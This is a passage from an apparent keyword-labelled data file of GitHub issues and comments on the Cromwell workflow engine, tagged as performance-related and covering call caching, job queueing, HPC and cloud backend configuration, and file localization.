hours; }; },; -------------------------------------------------------------------------; Q1. What is scriptBucketName ? I know it says in the documentation that it is where the scripts are stored/written by Cromwell.; For example, if our root bucket is s3://1234-bla-bla-executor/cromwell-execution, should scriptBucketName be ""1234-bla-bla-executor"" ? I understand that we are giving the full path in the root bucket, but is it related or completely unrelated to scriptBucketName ?. It looks like Cromwell is able to create script and reconfigured-script.sh files in the",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6832:727,concurren,concurrent-job-limit,727,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6832,1,['concurren'],['concurrent-job-limit']
Performance,"Hi Jeff, . The short answer is I don't know about the overall Cromwell world. . The longer answer is: it's intended for me to get around transient issues involving local filesystems and GridEngine dispatcher. . We'd either run into paths not found when it's a network mount issue; or submitting jobs to a GridEngine queue (e.g., UGER) where the job might get killed after a certain time-period or if it takes up too much resources, . I understand that Cromwell already have retry logic that deals with I/O issues or pre-emptible VMs in the GCP world. I'm not sure how to organize the configs and the code to harmonize these two retry world's, so I'll leave it to you except to state that we do want some kind of ""Retry"" in the GridEngine use case. . Thanks,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-295900647:316,queue,queue,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-295900647,1,['queue'],['queue']
Performance,"Hi Jeff,. You've built this great Actor system, but it needs to be actors on both ends. The round-robin pool of actors is not an actor system anymore if you cannot pass a Promise/Future/ActorRef to the other side, even if the API/channel capacity is limited. The status response should happen in less than a second, not an hour. We both know that we can have [millions of Actors in Akka/Scala](http://doc.akka.io/docs/akka/snapshot/general/actor-systems.html#What_you_should_not_concern_yourself_with), and the throughput on the Google network is huge. Thus no API limits should be prohibitive. I suggested using Pub/Sub API here:. https://github.com/broadinstitute/cromwell/issues/1089#issuecomment-229703152. And if that's not an option, you can implement the whole Google Genomics Pipeline API super-easy as an ephemeral GCE instance, which really is just becomes a promise/future. I even broke it down in a [post here](https://groups.google.com/forum/#!topic/google-genomics-discuss/_ox9h-C0_50), specifically in the paragraph that starts with **_So you might ask what exactly is an Operation resource_**:. https://groups.google.com/forum/#!topic/google-genomics-discuss/_ox9h-C0_50. You know my philosophy, always build it yourself to bypass any limitations :). `p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260214027:511,throughput,throughput,511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260214027,1,['throughput'],['throughput']
Performance,"Hi Kris,. That is great news, and of course I totally agree with the notification approach as things scale up ;) Though the issue might be when you get into millions/billions of operations later on, then there are some things that would need to be tweaked for that. As the number of operations scale up, the logging could then also become a bottleneck, as those are also API requests - besides the ones coming from the Pipeline API - and usually is a positive multiplier greater than 1 of the number of operations, with their own Retry requests. I think you'll agree that it's usually better to be more modular, so that things can easily be tweaked and updated over time - such as the transition to Pluggable Backends, but in this case for the Pipeline API directly. I agree with the capability of having fine-grained informational log events, though Pub/Sub API has certain limitations to be aware of:. https://cloud.google.com/pubsub/quotas#other_limits. Don't get me wrong, I'm still excited to see how version 2.0 of the Pipeline API evolves, but there are some tricky scalability issues that might emerge which could make the Cromwell code unnecessarily complex down the line, if one has to work through too many limitations/edge-cases. Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260279789:341,bottleneck,bottleneck,341,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260279789,2,"['bottleneck', 'scalab']","['bottleneck', 'scalability']"
Performance,"Hi Kristian,. I understand, but what you're asking is very possible - see my previous discussion here about creating 1 billion simultaneous connections, and anything that is not accessible can be pre-cached via buckets during idle periods (i.e. nightly):. https://github.com/googlegenomics/utils-java/issues/62#issuecomment-220444203. So you should be able to create your own Pipeline implementation very easily via `gloud create`, [VM metadata startup scripts](https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts) and/or Dataflow Pipelines, and mimic JES:. https://cloud.google.com/sdk/gcloud/reference/compute/instances/create. https://cloud.google.com/deployment-manager/step-by-step-guide/setting-metadata-and-startup-scripts. https://cloud.google.com/dataflow/pipelines/constructing-your-pipeline#applying-transforms-to-process-pipeline-data. If you look at the JES API, you'll notice most of it mirrors the `gcloud` commands and parameters:. https://www.googleapis.com/discovery/v1/apis/genomics/v1alpha2/rest. Again the concepts to speed up searches on dynamically streaming (processed) analysis results has a foundation via inverted indices, which search engines use all the time - I posted a couple of these here:. https://github.com/ga4gh/schemas/pull/253#issuecomment-97525342. https://github.com/ga4gh/schemas/issues/142#issuecomment-55518571. This way your searches are always fresh and would operate without any delay. Hope it helps,; Paul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605:200,cache,cached,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228175605,2,['cache'],['cached']
Performance,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:897,concurren,concurrently,897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443,2,['concurren'],['concurrently']
Performance,"Hi Sean,. Yeah I noticed that, and glad that it is in the process of getting fixed. Though this is precisely why we must have more control over the whole process, as creation of instances are basically just a cascade of events which get tied to an [**Operation**](https://developers.google.com/resources/api-libraries/documentation/compute/v1/java/latest/index.html?com/google/api/services/compute/model/Operation.html), through which you can interface with the VMs that are building or running. I have fairly high confidence that this is basically what is happening underneath the Google service endpoint when performing a [**RunPipelineRequest**](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53) through the [Pipeline API here](https://github.com/googleapis/googleapis/blob/c4899b3f0cef2caa73bb1a32baf00f54c8a49921/google/genomics/v1alpha2/pipelines.proto#L51-L53):. ```; rpc RunPipeline(RunPipelineRequest) returns (google.longrunning.Operation) {; option (google.api.http) = { post: ""/v1alpha2/pipelines:run"" body: ""*"" };; }; ```. If you think of this as a graph of best-effort networked dependent triggers via APIs, you can stabilize this to make it more predictable and scalable. It is just too obvious that we can collectively definitely make this better at this stage - as we already have the tools - and especially since we'll soon have nested workflows via https://github.com/broadinstitute/cromwell/issues/1532, which should be assumed to make the current number of operations in flight grow by several orders of magnitude. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994:611,perform,performing,611,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260533994,2,"['perform', 'scalab']","['performing', 'scalable']"
Performance,"Hi all,. As discussed with @TimothyTickle, @ruchim, @benjamincarlin, @gsaksena, @abaumann, @kshakir, @geoffjentry, and others at the Broad retreat and DSP holiday hackathon, we're putting a proposal for a new feature that reports task call resource utilization metrics to Stackdriver Monitoring API. This serves 2 important goals:. 1) Users can easily plot real-time resource usage statistics across all tasks in a workflow, or for a single task call across many workflow runs, etc. This can be very powerful to quickly determine outlier tasks that could use optimization, without the need for any configuration or code (or any changes to the workflow). It's also much easier than the current state-of-the-art, i.e. parsing task-level monitoring logs. 2) Scripts can easily get aggregate statistics on resource utilization and could produce suggestions based on those. This could provide a path towards automatic runtime configuration based on the models trained with historical data. One could also detect situations like out-of-memory calls and automatically adjust resources according to those. It would also be pretty easy to add logic for estimation of task call-level cost based on the pricing of associated resources. This could provide a long-sought feature of real-time cost monitoring/control (thanks to @TimothyTickle for the suggestion). Monitoring is done using the new ""monitoring action"" for PAPIv2, which currently uses the hard-coded [quay.io/broadinstitute/cromwell-monitor](https://quay.io/repository/broadinstitute/cromwell-monitor) image, built from https://github.com/broadinstitute/cromwell-monitor (I wasn't sure if that code belonged here or in a separate repo). This is advantageous to just using it as a _monitoring_script_, because it removes all assumptions on the ""user"" Docker image (for the task itself). For example, we don't have to assume a particular distribution or presence of Python and its libraries. So it should work exactly the same for any task. Per @geoffj",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510:559,optimiz,optimization,559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510,1,['optimiz'],['optimization']
Performance,"Hi all;; I'm running into a database write error on some systems. Similar to #3584, this does not cause the pipeline to stop, but is quite noisy and presumably affecting the ability to re-run and query run status. A CWL pipeline that triggers this is `somatic` from this set of minimal CWL test sets (https://github.com/bcbio/test_bcbio_cwl) but it appears to be system specific, rather than data specific. The same pipeline works fine on most systems, but only reports this database write error on some. When running we get this message on the completion of tasks:; ```; [2018-05-09 10:16:59,44] [[38;5;1merror[0m] 1bd683a6:prep_samples_to_rec:-1:1: Failure writing to call cache: data exception: string data, right truncation; table: CALL_CACHING_HASH_ENTRY column: HASH_KEY; java.sql.BatchUpdateException: data exception: string data, right truncation; table: CALL_CACHING_HASH_ENTRY column: HASH_KEY; 	at org.hsqldb.jdbc.JDBCPreparedStatement.executeBatch(Unknown Source); 	at com.zaxxer.hikari.pool.ProxyStatement.executeBatch(ProxyStatement.java:128); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeBatch(HikariProxyPreparedStatement.java); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.$anonfun$run$14(JdbcActionComponent.scala:532); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedStatement(JdbcBackend.scala:386); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedStatement$(JdbcBackend.scala:381); 	at slick.jdbc.JdbcBackend$BaseSession.withPreparedStatement(JdbcBackend.scala:448); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:501); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.run(JdbcActionComponent.scala:526); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:30); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:27); 	at slick.dbio.DBIOAction$$anon$1.$anonfun$run$",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3607:677,cache,cache,677,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3607,1,['cache'],['cache']
Performance,"Hi cromwell developers,. I'm having persistent errors similar to those in #2034 : stderr shows a line like this.; ; bash: path/to/my/cwd/cromwell-executions/my_workflow_name/some_hexadecimal_garbage/call-my_task_name/execution/script: Permission denied. Can you suggest a diagnosis or a workaround for this problem? I've tried to configure cromwell with LSF, and I suspect that's where the issue lies. Here's my complete configuration file. Thanks for your help!. include required(classpath(""application"")); backend {; default = LSF; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 16; ; runtime-attributes = """"""; Int cpu; Int nthreads; Float? memory_kb; """"""; ; submit = """"""; bsub \; -J ${job_name} \; -cwd ${cwd} \; -R rusage[mem=${memory_kb}] \; -n ${nthreads} \; -W ${cpu} \; -o ${out} \; -e ${err} \; ""${script} ""; """"""; ; kill = ""bkill ${job_id}""; check-alive = ""bjobs ${job_id}""; job-id-regex = ""Job <(\\d+)>.*""; }; }; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3185:651,concurren,concurrent-job-limit,651,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3185,1,['concurren'],['concurrent-job-limit']
Performance,"Hi everyone, . When I use cromwell + PBS backend I found the way that jobs are scheduled has some differences from using PBS alone. For example, I have a pipeline of 2 steps, A-B, where B depends on A. Now I want to submit this pipeline for 2 times which will generate 4 jobs A1 B1 A2 B2. Let's assume the cluster only have resource to run one of the jobs at a time. . When I use PBS alone all of the 4 jobs will be in the queue, at the beginning A1 gets to run and the others waiting. When A1 is done B1, A2 both have a chance to run depending on the priority PBS assigns to them. So the order of the four jobs might be A1-B1-A2-B2 or A1-A2-B1-B2. When I use cromwell + PBS backend cromwell will first send A1 and A2 to the queue without B1 and B2 since they won't be ready to run until A1 and A2 are done. When A1 is done A2 gets to run because it's the only job in the queue while B1 is on its way to the queue. So in this case the order of these jobs can only be A1-A2-B1-B2. This is not big issue when there are only a few pipelines to run. However, when I have, say 100 such pipelines, B1 has to wait until A100 to finish since when A1 finishes A2-A99 are already in the queue waiting and B1 has just set off. This means the finishing time of pipeline1(A1-B1) will be affected a lot by the total number of pipelines submitted to cromwell engine. . Is there any way for cromwell to change this situation (like sending all jobs to the backend without blocking any of them)? I really don't want to wait until all ""A""s to finish to get the first result of submitted pipelines. Hope I have made this problem clear. I have read the documents of cromwell and googled quit a bit but didn't find any solution. . Any help would be appreciated!. Yue",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6339:423,queue,queue,423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6339,5,['queue'],['queue']
Performance,"Hi folks,; I am running cromwell 36 with AWS batch. Doing the hello world example from the following:. https://aws.amazon.com/blogs/compute/using-cromwell-with-aws-batch/. I am able to submit from the swagger UI and am getting the following erro:. `2018-10-30 00:39:25,929 INFO - jobQueueArn: arn:aws:batch:us-east-2:365166883642:job-queue/GenomicsHighPriorityQue-0c2108973103ca2; 2018-10-30 00:39:25,929 INFO - taskId: wf_hello.hello-None-1; 2018-10-30 00:39:25,929 INFO - hostpath root: wf_hello/hello/bcc91ab0-fd91-41a8-b3e6-cbf091cb511d/None/1; 2018-10-30 00:39:25,965 cromwell-system-akka.dispatchers.backend-dispatcher-229 ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(bcc91ab0)wf_hello.hello:NA:1]: Error attempting to Execute; software.amazon.awssdk.core.exception.SdkClientException: Unable to execute HTTP request: batch.default.amazonaws.com: Name or service not known`. Any idea the source of this error?; <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334:334,queue,queue,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334,1,['queue'],['queue']
Performance,"Hi is this implemented in the latest version of cromwell? ; I am getting the following error for files > 5G with the latest version . 2019-10-31 04:31:17,243 cromwell-system-akka.dispatchers.engine-dispatcher-32 WARN - 85d92e7d-3017-4e8d-adac-551ebcd50165-EngineJobExecutionActor-jgi_meta.bbcms:NA:1 [UUID(85d92e7d)]: Failed copying cache results for job BackendJobDescriptorKey_CommandCallNode_jgi_meta.bbcms:-1:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - S3Exception: The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: 1272B7BFF87110E8)), invalidating cache entry.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-548974241:333,cache,cache,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-548974241,2,['cache'],['cache']
Performance,"Hi team,. I try to configure cromwell to run ExomeGermlineSingleSample_v3.1.9.wdl on Slurm, and I follow your guide, but I have an error that ${docker_script} : No such file or directory; /cromwell-executions/ExomeGermlineSingleSample/118135f5-ce0e-437b-9fd2-332dd614bded/call-GenerateSubsettedContaminationResources/execution/script : No such file or directory; I attached the run file; #!/bin/bash; #SBATCH --nodes=1; #SBATCH --time=2:00:00. module load jdk. java -Dconfig.file=/mainfs/wrgl/broadinstitute_warp_development/tutorials/cromwell-slurm_5.config \; -jar /mainfs/wrgl/broadinstitute_warp_development/tutorials/cromwell-85.jar \; run /mainfs/wrgl/broadinstitute_warp_development/warp/ExomeGermlineSingleSample_v3.1.9.wdl \; -i /mainfs/wrgl/broadinstitute_warp_development/tutorials/Exom_test.json. #### Configuration file ###. include required(classpath(""application"")). system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false; }. backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; temporary-directory = ""$(mktemp -d /tmp/tmp.XXXXXX)"". runtime-attributes = """"""; Int runtime_minutes = 60; Int cpu = 1; Int memory_mb = 3900; String? docker; """""". submit = """""" \; 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${out} \; -e ${err} \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap ""/bin/bash ${script}""'; """""". submit-docker = """""" \. # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; module load apptainer; if [ -z $APPTAINER_CACHEDIR ];; then CACHE_DIR=$HOME/.apptainer/cache; else CACHE_DIR=$APPTAINER_CACHEDIR; fi; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; LOCK_FILE",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7086:451,load,load,451,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7086,1,['load'],['load']
Performance,"Hi there!. I'm new to both WDL and Cromwell. I'm trying to run a workflow and the main input is an Illumina run folder, which could be up to a Tb in size. So I don't want it to be copied or hard-linked (which is almost the same in time) but to be soft-linked. I changed the localization option in the backend but then I'm getting the following error:. `Cannot localize directory with symbolic links`. So, isn't this possible? Will I always have to hard-linked the directories? This is not an option in my case due to performance issues. Everything is in the same shared file system, so I don't see the point in hard-linking. Also, if I call the same directory in different tasks, will it be hard-linked every time?. Thank you very much in advance!. Best,; Santiago",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3614:517,perform,performance,517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3614,1,['perform'],['performance']
Performance,"Hi there,. Biocontainers are incredibly popular tools in bioinformatics. Each time a [Bioconda recipe](https://bioconda.github.io/recipes.html) is made, a Biocontainer is automatically generated. This creates a collection of Dockerized tools immediately available to everybody. To reduce footprint, Biocontainers run on BusyBox, a Linux version tailored to embedded systems. Some tools therefore do not expose the full set of options of matching GNU tools on Ubuntu, CentOS, etc. Given the popularity of Biocontainers, it would be great if Cromwell could support them fully. There are a couple of small bugs related to `find` and `xargs` that should be easy to fix when one explores the file `stderr.background` for a task run from a Biocontainer:. ```; find: unrecognized: -empty; BusyBox v1.22.1 (2014-05-23 01:24:27 UTC) multi-call binary. Usage: find [-HL] [PATH]... [OPTIONS] [ACTIONS]. Search for files and perform actions on them.; First failed action stops processing of current file.; Defaults: PATH is current directory, action is '-print'. 	-L,-follow	Follow symlinks; 	-H		...on command line only; 	-xdev		Don't descend directories on other filesystems; 	-maxdepth N	Descend at most N levels. -maxdepth 0 applies; 			actions to command line arguments only; 	-mindepth N	Don't act on first N levels; 	-depth		Act on directory *after* traversing it. Actions:; 	( ACTIONS )	Group actions for -o / -a; 	! ACT		Invert ACT's success/failure; 	ACT1 [-a] ACT2	If ACT1 fails, stop, else do ACT2; 	ACT1 -o ACT2	If ACT1 succeeds, stop, else do ACT2; 			Note: -a has higher priority than -o; 	-name PATTERN	Match file name (w/o directory name) to PATTERN; 	-iname PATTERN	Case insensitive -name; 	-path PATTERN	Match path to PATTERN; 	-ipath PATTERN	Case insensitive -path; 	-regex PATTERN	Match path to regex PATTERN; 	-type X		File type is X (one of: f,d,l,b,c,...); 	-perm MASK	At least one mask bit (+MASK), all bits (-MASK),; 			or exactly MASK bits are set in file's mode; 	-mtime DAYS	mtime is ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4607:913,perform,perform,913,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4607,1,['perform'],['perform']
Performance,"Hi there,. I'm new to both WDL and Cromwell and am trying to get an analysis pipeline up and running. I'm using call-caching to speed up my development, so that I don't have to repeat multi-hour steps. However, I'm currently seeing ~8 minute delays for processing cache hits. With multiple steps in serial, this means that nothing in my pipeline starts running till 14 minutes after I start the run. Can you help me fix that?. Thank you for the help!. Happy to provide any more info than the below if that's helpful. I'm running with cromwell 84. Here's the command I'm running `java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar run workflow/expanse_workflow.wdl`. Here's my configuration (ignore the SLURM part, I'm not using it yet). Potentially important bits:; * I'm running with the local backend.; * I'm using symlink caching so that should be fast, with path+timestamp hash codes so the whole file doesn't need to be read; * I'm using the file based Hsql database. I don't see why that should matter, but maybe it does.; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # only use double quotes!; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; }. ## file based persistent database; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }. call-caching {; enabled = true; }. backend {; default = ""Local""; providers { ; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; submit = ""/usr/bin/env ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:264,cache,cache,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"Hi there,. There is an issue posting a cromwell job, getting the id from the response, and then trying to run a GET call too soon after the initial post. Here is a simple example. `curl -v ""localhost:8000/api/workflows/v1"" -F workflowSource=@simple.wdl -F workflowInputs=@simple.json | python -c 'import json,sys,time;obj=json.load(sys.stdin);print obj[""id""];' | xargs -I {} curl ""http://localhost:8000/api/workflows/v1/{}/status""`. The get response was. `{; ""status"": ""fail"",; ""message"": ""Unrecognized workflow ID: 054f9462-3775-4745-8ca6-5a63c9c4492f""; }` . Even though the 054f9462 ID was gotten directly from the original response. The simple solution is to add a sleep statement between the post and get. `curl -v ""localhost:8000/api/workflows/v1"" -F workflowSource=@simple.wdl -F workflowInputs=@simple.json | python -c 'import json,sys,time;obj=json.load(sys.stdin);time.sleep(10);print obj[""id""];' | xargs -I {} curl ""http://localhost:8000/api/workflows/v1/{}/status""`. The response was . `{""status"":""Submitted"",""id"":""897e2f30-2e4d-4cf0-9bb3-d926ec42dc6a""}`. Is there a way to know for sure the job is ready for a GET post? Or is this a bug, and the response JSON should be returned after GETs are available?. Thanks for your time!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2671:327,load,load,327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2671,2,['load'],['load']
Performance,"Hi! A task-level caching control has been introduced recently in the Cromwell 49. That's cool, thanks for the feature!. https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/; The example is using wdl specification 1.0 and it differs from draft-2 when tackling the meta section:. - draft-2 waits for a $string as a metadata value; - 1.0 waits for $meta_value = $string | $number | $boolean | 'null' | $meta_object | $meta_array. https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#metadata-section; https://github.com/openwdl/wdl/blob/master/versions/draft-2/SPEC.md#metadata-section. Hence, a `volatile: true` is not valid for draft-2, because a boolean is not a string. Is it possible to adapt the meta section for draft-2 specification too? In example: `volatile: ""true""`. The majority of our workflows still stick to the draft-2 and their translation to 1.0 will be painful.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-607310823:162,optimiz,optimizations,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-607310823,1,['optimiz'],['optimizations']
Performance,"Hi! A task-level caching control has been introduced recently in the Cromwell 49. That's cool, thanks for the feature!. https://cromwell.readthedocs.io/en/stable/optimizations/VolatileTasks/; The example is using wdl specification 1.0 and it differs from draft-2 when tackling the meta section:. - draft-2 waits for a $string as a metadata value; - 1.0 waits for $meta_value = $string | $number | $boolean | 'null' | $meta_object | $meta_array. https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#metadata-section; https://github.com/openwdl/wdl/blob/master/versions/draft-2/SPEC.md#metadata-section. Hence, a `volatile: true` is not valid for draft-2, because a boolean is not a string. Is it possible to adapt the meta section for draft-2 specification too? In example: `volatile: ""true""`. The majority of our workflows still stick to the draft-2 and their translation to 1.0 will be painful. The issue is related to https://github.com/broadinstitute/cromwell/issues/1695",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5476:162,optimiz,optimizations,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5476,1,['optimiz'],['optimizations']
Performance,"Hi!. First of all, thanks for merging the PR on the cached-copy localization strategy. We have been using at as a patch for about a month now in the LUMC on our SGE cluster. Since our cluster filesystem also interacts with Windows PC's which have a hard-link limit of 1024, the maximum hardlink limit on our cluster is set to 1000. Unfortunately we run into this limit fairly often when using the `cached-copy` strategy. When this happens cromwell will fallback to copying. This is good design, but unfortunately it uses a lot of disk space and takes a lot of time. This PR addresses that issue. When the hard-link limit is reached the hard-link in the cache will be removed. This hard-link will have pointed for example to inode 13820. Because there are plenty of hard-links still pointing to 13820, this inode is not removed, and all the jobs dependent on these files will still function.; Cromwell will copy the required file to the same path in the cache. This means the same path will now point to a different inode (for example: 13835). This inode has only 1 hardlink, so the hardlinking from this file in the cache can start with renewed vigor. Because the same path in the cache can be used, complex additional code in cromwell is not needed. Ideally I could get the maximum hard-link limit that Cromwell uses from the filesystem itself. But I could not find a way to do that. The limit is made to be configurable with a default of 950. Take the example case of having 9000 jobs that require the 3.8 GB reference genome, using a hard-link limit of 1000. Before this PR:. strategy | result; --- | ---; hard-link | fails when cromwell-executions is on a different disk. Allows up to 1000 hardlinks if on the same disk.; cached-copy | Allows up to 1000 hard-links regardless of which disk the original file is stored on.; soft-link | does not work with containers and is excluded.; copy | since hard-link or cached-copy can only handle a 1000 links, copy will be used 8000 times. Using 8000*3,8 =",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5043:52,cache,cached-copy,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5043,4,['cache'],"['cache', 'cached-copy']"
